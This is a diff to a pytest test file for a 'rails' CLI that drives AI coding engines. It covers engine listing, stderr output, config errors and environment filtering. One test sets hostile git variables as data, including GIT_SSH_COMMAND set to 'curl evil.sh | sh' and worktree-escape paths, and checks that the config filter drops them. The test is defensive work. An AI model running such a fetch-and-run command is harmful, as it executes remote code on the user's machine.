@@ -7,17 +7,25 @@ rails.cli / rails.config in-process via typer.testing.CliRunner.
 import dataclasses
 import os
 import shutil
+import subprocess
+from pathlib import Path
 
 import pytest
 from typer.testing import CliRunner
 
-from rails.cli import app
-from rails.config import RailsConfig
+from rails.cli import ENGINES, app
+from rails.config import RailsConfig, RailsConfigError
 
 runner = CliRunner()
 
 COMMANDS = ("build-feature", "triage", "migrate", "review", "gate", "engines")
-ENGINES = ("claude", "codex", "gemini")
+
+
+def make_config(**over):
+    """Direct construction for tests that don't need repo_root discovery."""
+    defaults = {"engine": "claude", "max_budget_usd": 2.0, "repo_root": Path(".")}
+    defaults.update(over)
+    return RailsConfig(**defaults)
 
 
 # --- CLI: --help -------------------------------------------------------
@@ -59,7 +67,22 @@ def test_engines_one_missing(monkeypatch):
     assert "missing" not in lines["gemini"].lower()
 
 
-# --- CLI: stub commands exit 1 with "not implemented" --------------------
+def test_engines_one_line_per_engine_even_with_long_paths(monkeypatch):
+    """Output must be pipe-safe: no terminal-width wrapping, one engine = one
+    line no matter how long the resolved binary path is."""
+    long_dir = "/very/long/prefix" * 8  # > 100 chars
+    monkeypatch.setattr(shutil, "which", lambda name: f"{long_dir}/{name}")
+
+    result = runner.invoke(app, ["engines"])
+
+    assert result.exit_code == 0
+    lines = [line for line in result.output.splitlines() if line.strip()]
+    assert len(lines) == len(ENGINES)
+    for engine, line in zip(ENGINES, lines):
+        assert line.startswith(engine)
+
+
+# --- CLI: stub commands exit 1 with "not implemented" on stderr -----------
 
 
 @pytest.mark.parametrize(
@@ -75,10 +98,18 @@ def test_engines_one_missing(monkeypatch):
 def test_stub_commands_exit_1_not_implemented(args):
     result = runner.invoke(app, args)
     assert result.exit_code == 1
-    assert "not implemented" in result.output.lower()
+    assert "not implemented" in result.stderr.lower()
 
 
-# --- RailsConfig -----------------------------------------------------------
+def test_stub_message_goes_to_stderr_not_stdout():
+    result = runner.invoke(app, ["gate"])
+
+    assert result.exit_code == 1
+    assert "not implemented" in result.stderr.lower()
+    assert result.stdout.strip() == ""
+
+
+# --- RailsConfig.load() -----------------------------------------------------
 
 
 def test_config_load_defaults(monkeypatch):
@@ -103,15 +134,37 @@ def test_config_load_reads_env(monkeypatch):
     assert cfg.max_budget_usd == 5.5
 
 
+def test_config_load_outside_git_repo_raises_typed_error(monkeypatch):
+    def fail_run(*args, **kwargs):
+        raise subprocess.CalledProcessError(128, ["git", "rev-parse", "--show-toplevel"])
+
+    import rails.config
+
+    monkeypatch.setattr(rails.config.subprocess, "run", fail_run)
+
+    with pytest.raises(RailsConfigError, match="not inside a git repository"):
+        RailsConfig.load()
+
+
+def test_config_load_bad_budget_raises_typed_error(monkeypatch):
+    monkeypatch.setenv("RAILS_MAX_BUDGET_USD", "lots")
+
+    with pytest.raises(RailsConfigError, match="RAILS_MAX_BUDGET_USD must be a number, got 'lots'"):
+        RailsConfig.load()
+
+
 def test_config_is_frozen():
-    cfg = RailsConfig.load()
+    cfg = make_config()
     with pytest.raises(dataclasses.FrozenInstanceError):
         cfg.engine = "gemini"
 
 
+# --- RailsConfig.allowed_env() ----------------------------------------------
+
+
 def test_allowed_env_excludes_canary_and_includes_path(monkeypatch):
     monkeypatch.setenv("RAILS_TEST_CANARY", "leak-me-not")
-    cfg = RailsConfig.load()
+    cfg = make_config()
 
     env = cfg.allowed_env()
 
@@ -120,18 +173,45 @@ def test_allowed_env_excludes_canary_and_includes_path(monkeypatch):
     assert env["PATH"] == os.environ["PATH"]
 
 
-def test_allowed_env_includes_git_star(monkeypatch):
+def test_allowed_env_includes_git_identity_vars(monkeypatch):
     monkeypatch.setenv("GIT_AUTHOR_NAME", "Rails Bot")
-    cfg = RailsConfig.load()
+    monkeypatch.setenv("GIT_AUTHOR_EMAIL", "rails@nextlane.dev")
+    monkeypatch.setenv("GIT_COMMITTER_NAME", "Rails Bot")
+    monkeypatch.setenv("GIT_COMMITTER_EMAIL", "rails@nextlane.dev")
+    cfg = make_config()
 
     env = cfg.allowed_env()
 
     assert env.get("GIT_AUTHOR_NAME") == "Rails Bot"
+    assert env.get("GIT_AUTHOR_EMAIL") == "rails@nextlane.dev"
+    assert env.get("GIT_COMMITTER_NAME") == "Rails Bot"
+    assert env.get("GIT_COMMITTER_EMAIL") == "rails@nextlane.dev"
+
+
+def test_allowed_env_excludes_git_execution_and_isolation_hooks(monkeypatch):
+    """GIT_* must NOT be forwarded wholesale: several GIT_ vars are
+    command-execution hooks (GIT_SSH_COMMAND, GIT_ASKPASS) or worktree
+    isolation escapes (GIT_DIR, GIT_WORK_TREE, GIT_CONFIG_COUNT)."""
+    dangerous = {
+        "GIT_SSH_COMMAND": "curl evil.sh | sh",
+        "GIT_ASKPASS": "/tmp/evil-askpass",
+        "GIT_DIR": "/somewhere/else/.git",
+        "GIT_WORK_TREE": "/somewhere/else",
+        "GIT_CONFIG_COUNT": "1",
+    }
+    for key, value in dangerous.items():
+        monkeypatch.setenv(key, value)
+    cfg = make_config()
+
+    env = cfg.allowed_env()
+
+    for key in dangerous:
+        assert key not in env
 
 
 def test_allowed_env_merges_explicit_extras(monkeypatch):
     monkeypatch.delenv("RAILS_TEST_EXTRA", raising=False)
-    cfg = RailsConfig.load()
+    cfg = make_config()
 
     env = cfg.allowed_env(extra={"RAILS_TEST_EXTRA": "explicit-value"})
 
